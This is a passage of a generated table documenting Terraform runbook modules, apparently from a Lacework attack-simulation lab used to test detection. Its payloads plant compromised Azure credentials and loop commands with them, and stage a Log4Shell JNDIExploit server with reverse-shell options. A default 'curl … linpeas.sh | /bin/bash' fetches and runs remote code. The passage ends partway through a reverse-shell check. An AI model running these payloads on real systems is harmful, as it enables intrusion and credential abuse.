120<br/>        done<br/>        log &quot;docker path: $&amp;&amp;#35;40;command &amp;#45;v  docker&amp;&amp;#35;41;&quot;<br/>        EOT<br/>        apt&amp;&amp;#35;95;packages = &quot;&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks =  &lt;&lt;&amp;#45;EOT<br/>        log &quot;Checking for docker&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        while &amp;#33; command &amp;#45;v docker &gt; /dev/null &amp;#124;&amp;#124; &amp;#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &amp;#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&amp;&amp;#35;40;command &amp;#45;v  docker&amp;&amp;#35;41;&quot;<br/>        EOT<br/>        yum&amp;&amp;#35;95;packages = &quot;&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;&amp;&amp;#35;93;<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| target-runbook-execute-generate-azure-cli-traffic-target | ./modules/runbook/execute-generate-azure-cli-traffic | runbook_exec_generate_azure_cli_traffic_target   | context.azure.runbook.target.execute.generate_azure_cli_traffic   | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;target&quot;: {<br/>                    &quot;execute&quot;: {<br/>                        &quot;generate_azure_cli_traffic&quot;: {<br/>                            &quot;commands&quot;: [],<br/>                            &quot;compromised_credentials&quot;: {},<br/>                            &quot;compromised_keys_user&quot;: null,<br/>                            &quot;enabled&quot;: false,<br/>                            &quot;profile&quot;: &quot;azure-traffic&quot;<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-generate-azure-cli-traffic | <pre>locals &amp;&amp;#35;123;<br/>    tool = &quot;az&quot;<br/>    attack&amp;&amp;#35;95;dir = &quot;/generate&amp;#45;azure&amp;#45;cli&amp;#45;traffic&quot;<br/>    azure&amp;&amp;#35;95;creds = var&amp;#46;inputs&amp;&amp;#35;91;&quot;compromised&amp;&amp;#35;95;credentials&quot;&amp;&amp;#35;93;&amp;&amp;#35;91;var&amp;#46;inputs&amp;&amp;#35;91;&quot;compromised&amp;&amp;#35;95;keys&amp;&amp;#35;95;user&quot;&amp;&amp;#35;93;&amp;&amp;#35;93;&amp;#46;rendered<br/>    azure&amp;&amp;#35;95;commands = join&amp;&amp;#35;40;&quot;&amp;&amp;#35;92;n&quot;, &amp;&amp;#35;91; for command in var&amp;#46;inputs&amp;&amp;#35;91;&quot;commands&quot;&amp;&amp;#35;93;: &quot;$&amp;&amp;#35;123;command&amp;&amp;#35;125;&quot; &amp;&amp;#35;93;&amp;&amp;#35;41;<br/><br/>    payload = &lt;&lt;&amp;#45;EOT<br/>    rm &amp;#45;rf $&amp;&amp;#35;123;local&amp;#46;attack&amp;&amp;#35;95;dir&amp;&amp;#35;125;<br/>    mkdir &amp;#45;p $&amp;&amp;#35;123;local&amp;#46;attack&amp;&amp;#35;95;dir&amp;&amp;#35;125;<br/>    cd $&amp;&amp;#35;123;local&amp;#46;attack&amp;&amp;#35;95;dir&amp;&amp;#35;125;<br/>    log &quot;Deploying azure credentials&amp;#46;&amp;#46;&amp;#46;&quot;<br/>    mkdir &amp;#45;p ~/&amp;#46;azure<br/>    if &amp;&amp;#35;91;  &quot;$&amp;&amp;#35;123; local&amp;#46;azure&amp;&amp;#35;95;creds == &quot;&quot; ? &quot;false&quot; : &quot;true&quot; &amp;&amp;#35;125;&quot; == &quot;true&quot; &amp;&amp;#35;93;; then<br/>      echo $&amp;&amp;#35;123;base64gzip&amp;&amp;#35;40;local&amp;#46;azure&amp;&amp;#35;95;creds&amp;&amp;#35;41;&amp;&amp;#35;125; &amp;#124; base64 &amp;#45;d &amp;#124; gunzip &gt; ~/&amp;#46;azure/my&amp;#46;azureauth<br/>      export AZURE&amp;&amp;#35;95;AUTH&amp;&amp;#35;95;LOCATION=~/&amp;#46;azure/my&amp;#46;azureauth<br/>    fi<br/>    log &quot;Running azure commands&amp;#46;&amp;#46;&amp;#46;&quot;<br/>    START&amp;&amp;#35;95;HASH=$&amp;&amp;#35;40;sha256sum &amp;#45;&amp;#45;text /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME &amp;#124; awk &#x27;&amp;&amp;#35;123; print $1 &amp;&amp;#35;125;&#x27;&amp;&amp;#35;41;<br/>    while true; do<br/>        $&amp;&amp;#35;123;local&amp;#46;azure&amp;&amp;#35;95;commands&amp;&amp;#35;125;<br/>        log &#x27;waiting 30 minutes&amp;#46;&amp;#46;&amp;#46;&#x27;;<br/>        sleep 1800<br/>        if &amp;#33; check&amp;&amp;#35;95;payload&amp;&amp;#35;95;update /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME $START&amp;&amp;#35;95;HASH; then<br/>            log &quot;payload update detected &amp;#45; exiting loop and forcing payload download&quot;<br/>            rm &amp;#45;f /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        fi<br/>    done<br/>    log &quot;Done&amp;#46;&quot;<br/>    EOT<br/>    <br/>    base64&amp;&amp;#35;95;payload = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &lt;&lt;&amp;#45;EOT<br/>        while &amp;#33; command &amp;#45;v $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; &gt; /dev/null; do<br/>            log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; not found or not ready &amp;#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        EOT<br/>        apt&amp;&amp;#35;95;packages = &quot;&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks =  &lt;&lt;&amp;#45;EOT<br/>        while &amp;#33; command &amp;#45;v $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; &gt; /dev/null; do<br/>            log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; not found or not ready &amp;#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        EOT<br/>        yum&amp;&amp;#35;95;packages = &quot;&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;&amp;&amp;#35;93;<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| attacker-runbook-execute-docker-exploit-log4j            | ./modules/runbook/execute-docker-exploit-log4j       | runbook_exec_docker_exploit_log4j_app            | context.azure.runbook.attacker.execute.docker_exploit_log4j_app   | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;attacker&quot;: {<br/>                    &quot;execute&quot;: {<br/>                        &quot;docker_exploit_log4j_app&quot;: {<br/>                            &quot;attack_delay&quot;: 50400,<br/>                            &quot;attacker_http_port&quot;: 8088,<br/>                            &quot;attacker_ip&quot;: null,<br/>                            &quot;attacker_ldap_port&quot;: 1389,<br/>                            &quot;enabled&quot;: false,<br/>                            &quot;payload&quot;: &quot;curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files&quot;,<br/>                            &quot;reverse_shell&quot;: false,<br/>                            &quot;reverse_shell_port&quot;: 0,<br/>                            &quot;target_ip&quot;: null,<br/>                            &quot;target_port&quot;: null<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                   | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-docker-exploit-log4j       | <pre>locals &amp;&amp;#35;123;<br/>    attack&amp;&amp;#35;95;dir = &quot;/jndiexploit&quot;<br/>    attack&amp;&amp;#35;95;script = &quot;jndiexploit&amp;#46;sh&quot;<br/>    start&amp;&amp;#35;95;script = &quot;delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;<br/>    lock&amp;&amp;#35;95;file = &quot;/tmp/delay&amp;&amp;#35;95;log4shell&amp;#46;lock&quot;<br/>    jndiexploit&amp;&amp;#35;95;url=&quot;https://github&amp;#46;com/credibleforce/jndi/raw/main/jndi&amp;#46;base64&quot;<br/>    image = &quot;openjdk:11&quot;<br/>    name = &quot;jndiexploit&quot;<br/>    exec&amp;&amp;#35;95;type = var&amp;#46;inputs&amp;&amp;#35;91;&quot;reverse&amp;&amp;#35;95;shell&quot;&amp;&amp;#35;93; == true ? &quot;ReverseShell&quot; : &quot;Basic/Command/Base64&quot;<br/><br/>    &amp;#35; only base64 encode the payload if we are executing a command<br/>    base64&amp;&amp;#35;95;log4shell&amp;&amp;#35;95;payload= urlencode&amp;&amp;#35;40;var&amp;#46;inputs&amp;&amp;#35;91;&quot;reverse&amp;&amp;#35;95;shell&quot;&amp;&amp;#35;93; == true ? var&amp;#46;inputs&amp;&amp;#35;91;&quot;payload&quot;&amp;&amp;#35;93; : base64encode&amp;&amp;#35;40;<br/>       replace&amp;&amp;#35;40;replace&amp;&amp;#35;40;var&amp;#46;inputs&amp;&amp;#35;91;&quot;payload&quot;&amp;&amp;#35;93;, &quot;$ATTACKER&amp;&amp;#35;95;IP&quot;, var&amp;#46;inputs&amp;&amp;#35;91;&quot;attacker&amp;&amp;#35;95;ip&quot;&amp;&amp;#35;93;&amp;&amp;#35;41;, &quot;$REVERSE&amp;&amp;#35;95;SHELL&amp;&amp;#35;95;PORT&quot;, var&amp;#46;inputs&amp;&amp;#35;91;&quot;reverse&amp;&amp;#35;95;shell&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;&amp;&amp;#35;41;<br/>    &amp;&amp;#35;41;&amp;&amp;#35;41;<br/>    payload = &lt;&lt;&amp;#45;EOT<br/>    log &quot;removing previous app directory&quot;<br/>    docker stop $&amp;&amp;#35;123;local&amp;#46;name&amp;&amp;#35;125;<br/>    rm &amp;#45;rf $&amp;&amp;#35;123;local&amp;#46;attack&amp;&amp;#35;95;dir&amp;&amp;#35;125;<br/>    log &quot;creating app directory&quot;<br/>    mkdir &amp;#45;p $&amp;&amp;#35;123;local&amp;#46;attack&amp;&amp;#35;95;dir&amp;&amp;#35;125;<br/>    cd $&amp;&amp;#35;123;local&amp;#46;attack&amp;&amp;#35;95;dir&amp;&amp;#35;125;<br/>    <br/>    log &quot;starting script&amp;#46;&amp;#46;&amp;#46;&quot;<br/>    JNDIEXPLOIT&amp;&amp;#35;95;URL=&quot;$&amp;&amp;#35;123;local&amp;#46;jndiexploit&amp;&amp;#35;95;url&amp;&amp;#35;125;&quot;<br/>    NAME=&quot;$&amp;&amp;#35;123;local&amp;#46;name&amp;&amp;#35;125;&quot;<br/>    IMAGE=&quot;$&amp;&amp;#35;123;local&amp;#46;image&amp;&amp;#35;125;&quot;<br/>    ATTACKER&amp;&amp;#35;95;IP=&quot;$&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;attacker&amp;&amp;#35;95;ip&quot;&amp;&amp;#35;93;&amp;&amp;#35;125;&quot;<br/>    ATTACKER&amp;&amp;#35;95;HTTP&amp;&amp;#35;95;PORT=$&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;attacker&amp;&amp;#35;95;http&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;&amp;&amp;#35;125;<br/>    ATTACKER&amp;&amp;#35;95;LDAP&amp;&amp;#35;95;PORT=$&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;attacker&amp;&amp;#35;95;ldap&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;&amp;&amp;#35;125;<br/>    TARGET&amp;&amp;#35;95;IP=$&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;target&amp;&amp;#35;95;ip&quot;&amp;&amp;#35;93;&amp;&amp;#35;125;<br/>    TARGET&amp;&amp;#35;95;PORT=$&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;target&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;&amp;&amp;#35;125;<br/>    EXEC&amp;&amp;#35;95;TYPE=&quot;$&amp;&amp;#35;123;local&amp;#46;exec&amp;&amp;#35;95;type&amp;&amp;#35;125;&quot;<br/>    REVERSE&amp;&amp;#35;95;SHELL&amp;&amp;#35;95;PORT=&quot;$&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;reverse&amp;&amp;#35;95;shell&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;&amp;&amp;#35;125;&quot;<br/>    BASE64&amp;&amp;#35;95;PAYLOAD=&quot;$&amp;&amp;#35;123;local&amp;#46;base64&amp;&amp;#35;95;log4shell&amp;&amp;#35;95;payload&amp;&amp;#35;125;&quot;<br/>    PUBLIC&amp;&amp;#35;95;IP=$&amp;&amp;#35;40;curl &amp;#45;s https://icanhazip&amp;#46;com&amp;&amp;#35;41;<br/>    TIMEOUT=1800<br/>    START&amp;&amp;#35;95;TIME=$&amp;&amp;#35;40;date &amp;#43;%s&amp;&amp;#35;41;<br/>    &amp;#35; Check if $ATTACKER&amp;&amp;#35;95;IP is an IP address<br/>    if &amp;&amp;#35;91;&amp;&amp;#35;91; $ATTACKER&amp;&amp;#35;95;IP =~ ^&amp;&amp;#35;91;0&amp;#45;9&amp;&amp;#35;93;&amp;#43;&amp;&amp;#35;92;&amp;#46;&amp;&amp;#35;91;0&amp;#45;9&amp;&amp;#35;93;&amp;#43;&amp;&amp;#35;92;&amp;#46;&amp;&amp;#35;91;0&amp;#45;9&amp;&amp;#35;93;&amp;#43;&amp;&amp;#35;92;&amp;#46;&amp;&amp;#35;91;0&amp;#45;9&amp;&amp;#35;93;&amp;#43;$ &amp;&amp;#35;93;&amp;&amp;#35;93;; then<br/>        log &quot;server is set to IP address $ATTACKER&amp;&amp;#35;95;IP, no need to resolve DNS&quot;<br/>    else<br/>        log &quot;checking dns resolution: $ATTACKER&amp;&amp;#35;95;IP&quot;<br/>        while true; do<br/>            IP=$&amp;&amp;#35;40;dig &amp;#43;short $ATTACKER&amp;&amp;#35;95;IP&amp;&amp;#35;41;<br/>            if &amp;&amp;#35;91; &amp;#45;z &quot;$IP&quot; &amp;&amp;#35;93;; then  &amp;#35; If $IP is empty, the domain hasn&#x27;t resolved yet<br/>                CURRENT&amp;&amp;#35;95;TIME=$&amp;&amp;#35;40;date &amp;#43;%s&amp;&amp;#35;41;<br/>                ELAPSED&amp;&amp;#35;95;TIME=$&amp;&amp;#35;40;&amp;&amp;#35;40;CURRENT&amp;&amp;#35;95;TIME &amp;#45; START&amp;&amp;#35;95;TIME&amp;&amp;#35;41;&amp;&amp;#35;41;<br/>                if &amp;&amp;#35;91; $ELAPSED&amp;&amp;#35;95;TIME &amp;#45;gt $TIMEOUT &amp;&amp;#35;93;; then<br/>                    log &quot;DNS resolution for $ATTACKER&amp;&amp;#35;95;IP timed out after $TIMEOUT seconds&quot;<br/>                    exit 1<br/>                fi<br/>                sleep 10<br/>            else<br/>                log &quot;Current public ip: $PUBLIC&amp;&amp;#35;95;IP&quot;<br/>                log &quot;$ATTACKER&amp;&amp;#35;95;IP resolved to $IP&quot;<br/>                if &amp;&amp;#35;91; &quot;$IP&quot; == &quot;$PUBLIC&amp;&amp;#35;95;IP&quot; &amp;&amp;#35;93;; then<br/>                    log &quot;Resolution matches public ip: $IP == $PUBLIC&amp;&amp;#35;95;IP&quot;<br/>                    break<br/>                else<br/>                    log &quot;Resolution of dns does not match: $IP &amp;#33;= $PUBLIC&amp;&amp;#35;95;IP&quot;<br/>                    sleep 10<br/>                fi<br/>            fi<br/>        done<br/>    fi<br/><br/>    if &amp;&amp;#35;91;&amp;&amp;#35;91; &amp;#33; &amp;#45;f &quot;jndi&amp;#46;base64&quot; &amp;#124;&amp;#124; &amp;#33; &amp;#45;f &quot;JNDIExploit&amp;#45;1&amp;#46;2&amp;#45;SNAPSHOT&amp;#46;jar&quot; &amp;&amp;#35;93;&amp;&amp;#35;93;; then<br/>        rm &amp;#45;f jndi&amp;#46;base64 &amp;&amp;#35;42;&amp;#46;zip JNDIExploit&amp;#45;&amp;&amp;#35;42;&amp;#46;jar<br/>        wget https://github&amp;#46;com/credibleforce/jndi/raw/main/jndi&amp;#46;base64<br/>        base64 &amp;#45;d jndi&amp;#46;base64 &gt; JNDIExploit&amp;#46;1&amp;#46;2&amp;#46;zip<br/>        unzip &amp;#45;o JNDIExploit&amp;#46;&amp;&amp;#35;42;&amp;#46;zip<br/>        rm &amp;&amp;#35;42;&amp;#46;zip<br/>    fi<br/><br/>    START&amp;&amp;#35;95;HASH=$&amp;&amp;#35;40;sha256sum &amp;#45;&amp;#45;text /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME &amp;#124; awk &#x27;&amp;&amp;#35;123; print $1 &amp;&amp;#35;125;&#x27;&amp;&amp;#35;41;<br/>    while true; do<br/>        log &quot;setting up jndiexploit in screen session&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        if pgrep &amp;#45;f &quot;JNDIExploit&quot;; then<br/>            kill &amp;#45;9 $&amp;&amp;#35;40;pgrep &amp;#45;f &quot;JNDIExploit&quot;&amp;&amp;#35;41;<br/>        fi<br/>        JNDIEXPLOIT&amp;&amp;#35;95;LOG=&quot;/tmp/jndiexploit&amp;#46;log&quot;<br/>        for i in &amp;&amp;#35;96;seq $&amp;&amp;#35;40;&amp;&amp;#35;40;MAXLOG&amp;#45;1&amp;&amp;#35;41;&amp;&amp;#35;41; &amp;#45;1 1&amp;&amp;#35;96;; do mv &quot;$JNDIEXPLOIT&amp;&amp;#35;95;LOG&amp;#46;&quot;&amp;&amp;#35;123;$i,$&amp;&amp;#35;40;&amp;&amp;#35;40;i&amp;#43;1&amp;&amp;#35;41;&amp;&amp;#35;41;&amp;&amp;#35;125; 2&gt;/dev/null &amp;#124;&amp;#124; true; done<br/>        mv $JNDIEXPLOIT&amp;&amp;#35;95;LOG &quot;$JNDIEXPLOIT&amp;&amp;#35;95;LOG&amp;#46;1&quot; 2&gt;/dev/null &amp;#124;&amp;#124; true<br/>        screen &amp;#45;S jndiexploit &amp;#45;X quit<br/>        screen &amp;#45;wipe<br/>        screen &amp;#45;d &amp;#45;L &amp;#45;Logfile $JNDIEXPLOIT&amp;&amp;#35;95;LOG &amp;#45;S jndiexploit &amp;#45;m java &amp;#45;jar JNDIExploit&amp;#45;&amp;&amp;#35;42;&amp;#46;jar &amp;#45;&amp;#45;ip $ATTACKER&amp;&amp;#35;95;IP &amp;#45;&amp;#45;httpPort 8088 &amp;#45;&amp;#45;ldapPort 1389<br/>        screen &amp;#45;S jndiexploit &amp;#45;X colon &quot;logfile flush 0^M&quot;<br/><br/>        log &quot;sleeping 15 minutes&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        sleep 900<br/>        log &quot;start services availability check&amp;#46;&amp;#46;&amp;#46;&quot;<br/><br/>        log &quot;checking target: $TARGET&amp;&amp;#35;95;IP:$TARGET&amp;&amp;#35;95;PORT&quot;<br/>        while &amp;#33; nc &amp;#45;z &amp;#45;w 5 &amp;#45;vv $TARGET&amp;&amp;#35;95;IP $TARGET&amp;&amp;#35;95;PORT &gt; /dev/null; do<br/>            log &quot;failed check &amp;#45; waiting for target: $TARGET&amp;&amp;#35;95;IP:$TARGET&amp;&amp;#35;95;PORT&quot;;<br/>            sleep 30;<br/>            if &amp;#33; screen &amp;#45;ls &amp;#124; grep jndiexploit; then<br/>                log &quot;screen session no longer running&amp;#46;&amp;#46;&amp;#46;reset required&quot;<br/>                break<br/>            fi<br/>            if &amp;#33; check&amp;&amp;#35;95;payload&amp;&amp;#35;95;update /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME $START&amp;&amp;#35;95;HASH; then<br/>                log &quot;payload update detected &amp;#45; exiting loop and forcing payload download&quot;<br/>                rm &amp;#45;f /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME<br/>                break 2<br/>            fi<br/>        done;<br/>        if &amp;#33; screen &amp;#45;ls &amp;#124; grep jndiexploit; then<br/>            log &quot;screen session no longer running&amp;#46;&amp;#46;&amp;#46;reset required&quot;<br/>            break<br/>        fi<br/>        log &quot;target available&quot;;<br/>        log &quot;checking attacker ldap: $ATTACKER&amp;&amp;#35;95;IP:$ATTACKER&amp;&amp;#35;95;LDAP&amp;&amp;#35;95;PORT&quot;<br/>        while &amp;#33; nc &amp;#45;z &amp;#45;w 5 &amp;#45;vv $ATTACKER&amp;&amp;#35;95;IP $ATTACKER&amp;&amp;#35;95;LDAP&amp;&amp;#35;95;PORT &gt; /dev/null; do<br/>            log &quot;failed check &amp;#45; waiting for attacker ldap: $ATTACKER&amp;&amp;#35;95;IP:$ATTACKER&amp;&amp;#35;95;LDAP&amp;&amp;#35;95;PORT&quot;;<br/>            sleep 30;<br/>            if &amp;#33; screen &amp;#45;ls &amp;#124; grep jndiexploit; then<br/>                log &quot;screen session no longer running&amp;#46;&amp;#46;&amp;#46;reset required&quot;<br/>                break<br/>            fi<br/>            if &amp;#33; check&amp;&amp;#35;95;payload&amp;&amp;#35;95;update /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME $START&amp;&amp;#35;95;HASH; then<br/>                log &quot;payload update detected &amp;#45; exiting loop and forcing payload download&quot;<br/>                rm &amp;#45;f /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME<br/>                break 2<br/>            fi<br/>        done;<br/>        if &amp;#33; screen &amp;#45;ls &amp;#124; grep jndiexploit; then<br/>            log &quot;screen session no longer running&amp;#46;&amp;#46;&amp;#46;reset required&quot;<br/>            break<br/>        fi<br/>        log &quot;attacker ldap available&quot;;<br/>        log &quot;checking attacker http: $ATTACKER&amp;&amp;#35;95;IP:$ATTACKER&amp;&amp;#35;95;HTTP&amp;&amp;#35;95;PORT&quot;<br/>        while &amp;#33; nc &amp;#45;z &amp;#45;w 5 &amp;#45;vv $ATTACKER&amp;&amp;#35;95;IP $ATTACKER&amp;&amp;#35;95;HTTP&amp;&amp;#35;95;PORT &gt; /dev/null; do<br/>            log &quot;failed check &amp;#45; waiting for attacker http: $ATTACKER&amp;&amp;#35;95;IP:$ATTACKER&amp;&amp;#35;95;HTTP&amp;&amp;#35;95;PORT&quot;;<br/>            sleep 30;<br/>            if &amp;#33; screen &amp;#45;ls &amp;#124; grep jndiexploit; then<br/>                log &quot;screen session no longer running&amp;#46;&amp;#46;&amp;#46;reset required&quot;<br/>                <br/>            fi<br/>            if &amp;#33; check&amp;&amp;#35;95;payload&amp;&amp;#35;95;update /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME $START&amp;&amp;#35;95;HASH; then<br/>                log &quot;payload update detected &amp;#45; exiting loop and forcing payload download&quot;<br/>                rm &amp;#45;f /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME<br/>                break 2<br/>            fi<br/>        done;<br/>        if &amp;#33; screen &amp;#45;ls &amp;#124; grep jndiexploit; then<br/>            log &quot;screen session no longer running&amp;#46;&amp;#46;&amp;#46;reset required&quot;<br/>            break<br/>        fi<br/>        log &quot;attacker http available&quot;;<br/>        if &amp;&amp;#35;91; &quot;0&quot; &amp;#33;= &quot;$REVERSE&amp;&amp;#35;95;SHELL&amp;&amp;#35;95;PORT&quot; &amp;&amp;#35;93;; then<br/>            log &quot;checking attacker reverse shell: 